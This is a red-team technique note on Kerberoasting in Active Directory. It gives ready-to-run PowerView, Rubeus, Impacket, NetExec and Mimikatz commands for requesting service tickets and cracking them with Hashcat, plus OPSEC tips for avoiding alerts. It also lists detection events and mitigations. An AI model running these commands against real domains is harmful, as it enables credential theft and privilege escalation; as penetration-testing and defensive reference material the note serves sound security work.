---
tags:
  - "#type/technique"
  - "#tactic/TA0006"
  - "#technique/T1558003"
  - "#stage/privilege-escalation"
  - "#stage/lateral-movement"
  - "#os/windows"
  - "#os/linux"
  - "#tool/rubeus"
  - "#tool/impacket"
  - "#tool/powerview"
  - "#tool/hashcat"
aliases:
  - Steal or Forge Kerberos Tickets
  - SPN Roasting
  - Kerberoast
---
## Technique
___
Kerberoasting is a post-exploitation attack technique that targets Microsoft Active Directory. An attacker with credentials for any valid domain account (even a low-privilege one) can request Kerberos service tickets for accounts that have a Service Principal Name (SPN) configured.

A portion of the returned ticket-granting service (TGS) ticket is encrypted with the NTLM hash of the service account's password. The attacker captures this ticket and takes it offline to crack the password using brute-force methods. Since the cracking happens offline, it does not generate failed login events on the network, making it a stealthy way to escalate privileges by compromising potentially high-value service accounts.

## Prerequisites
___

**Access Level:** A valid Active Directory domain account. No special or elevated privileges are required.

**System State:** The attacker must have network access to a Domain Controller to request tickets.

**Information:** The attacker needs to identify user accounts (not computer accounts) that have an SPN configured.

**Misc**: Your system time must be synced with the DC

Linux:

```bash
sudo timedatectl set-ntp off
sudo rdate -n <targetDC>
```

Windows:

```powershell
NET TIME /DOMAIN
NET TIME \\<MACHINENAME> /SET /Y
NET TIME \\<IP Address> /SET /Y
```


## Considerations
___

**Impact**

Successful cracking of a service account password can lead to significant privilege escalation and lateral movement. Service accounts are often misconfigured with excessive permissions (including Domain Admin) to ensure applications work, making them high-value targets.

**OPSEC**

- **Noise:** Requesting service tickets for many SPNs in a short period can trigger alerts. A single user requesting dozens or hundreds of TGS tickets (Event ID 4769) is highly anomalous.

- **Weak Encryption:** Modern tools like Rubeus allow you to request tickets using the weaker RC4 encryption algorithm (`-rc4opsec`). While this makes cracking easier, requesting a ticket with encryption type `0x17` (RC4-HMAC) in an environment that defaults to AES is a major red flag for defenders.

- **Honeypots:** Defenders can create fake service accounts with tempting SPNs (e.g., `sql_prod_admin_svc`) and monitor them. Any ticket requests for these honeypot accounts are an immediate indicator of compromise.

## Execution
___
### Requesting a ticket
#### **PowerView.ps1**

Identify kerberoastable users

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

Request ticket

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

#### **Rubeus**

Get information about kerberoastable users

```powershell
.\Rubeus.exe kerberoast /stats
```

Kerberoast all users

```powershell
.\Rubeus.exe kerberoast 
```

**Useful flags**:

- `/outfile` outputs roasted hashes to the specified file, one per line.
- `/tgtdeleg` accounts with AES enabled in `msDS-SupportedEncryptionTypes` will have RC4 tickets requested. (Doesn't work on >= Win 2019)
- `/rc4opsec` tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted.
- `/simple` output tickets one per line in the terminal
- `/nowrap` don't wrap new lines and output to terminal
- `/user:<DomainUser>` specify user to kerberoast

#### **Impacket**

Kerberoast all users

```bash
impacket-GetUserSPNs domain.local/username:'password' -request -dc-ip <dcip>
```

Kerberoast specific user

```bash
impacket-GetUserSPNs domain.local/username:'password' -request-user <user> -dc-ip <dcip>
```

**Useful flags:**

- `-outputfile` send output to file

#### **NetExec**

```bash
nxc ldap <IP> -u 'user' -p '' --kerberoasting <OUTFILE>
```

#### **PowerShell** + Mimikatz

Identify kerberoastable users.

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

```
setspn.exe -Q */*
```

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.domain.local:1433"
```

```powershell
mimikatz # base64 /out:true
mimikatz # kerberos::list 
```

```powershell
echo "<base64 blob>" |  tr -d \\n
```

```bash
cat encoded_file | base64 -d > sqldev.kirbi
```

```bash
python2.7 kirbi2john.py sqldev.kirbi
```

This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

### Cracking a ticket

|Encryption Type (etype)|Name / Algorithm|Hashcat Mode|Notes / Where Seen|
|---|---|---|---|
|`23`|RC4-HMAC (arcfour-hmac-md5)|**13100**|Default for older AD, common in Kerberoasting. Weak, fastest to crack.|
|`17`|AES128-CTS-HMAC-SHA1-96|**19600**|Seen when RC4 is disabled; newer/modern service accounts.|
|`18`|AES256-CTS-HMAC-SHA1-96|**19700**|Stronger; common when "AES only" enforced.|
|`3`|DES-CBC-MD5|_Obsolete_ (no current Hashcat mode)|Legacy, should be disabled.|
|`RC4-HMAC-OLD` / `etype 24`|RC4-HMAC with old salt usage (rare)|Use **13100**|Rare edge cases, still cracks with RC4 mode.|
[[hash_cracking]]

### Cleanup Considerations

- None

### Detection & Mitigation

#### Detection

- Event ID 4769: A Kerberos service ticket was requested

- Requests where the Ticket Encryption Type is 0x17 (RC4). In a modern environment, this should be rare

- Requests for service tickets from unusual workstations or for accounts that rarely see this activity.

- LDAP queries that search for accounts with an SPN like `(servicePrincipalName=*)`

- Create a honey account and make a custom alert for tickets requested for that account

#### Mitigation

- **Strong Passwords**: This is the most effective mitigation. Enforce a strong password policy for service accounts

- **Use Group Managed Service Accounts**: gMSAs are the gold standard. Their passwords are 240 characters long, complex, and automatically managed and rotated by Active Directory

- **Protected Users Group**: Add high-value accounts (including service accounts where possible) to the "Protected Users" security group. This enforces stronger security controls, such as disabling NTLM and preventing the use of weaker Kerberos encryption types.